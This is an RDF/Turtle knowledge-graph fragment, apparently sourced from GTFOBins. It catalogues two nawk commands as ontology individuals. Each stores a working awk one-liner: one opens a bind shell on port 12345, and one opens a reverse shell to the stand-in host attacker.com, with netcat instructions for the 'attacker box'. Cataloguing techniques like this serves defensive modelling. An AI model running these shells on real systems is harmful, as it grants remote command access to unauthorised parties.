mknd:command_nawk-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nawk-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell." ;
    d3f:uses mknd:executable_nawk ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nawk ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """LPORT=12345
nawk -v LPORT=$LPORT 'BEGIN {
    s = "/inet/tcp/" LPORT "/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
""" .

mknd:command_nawk-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nawk-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_nawk ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nawk ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """RHOST=attacker.com
RPORT=12345
nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
""" .

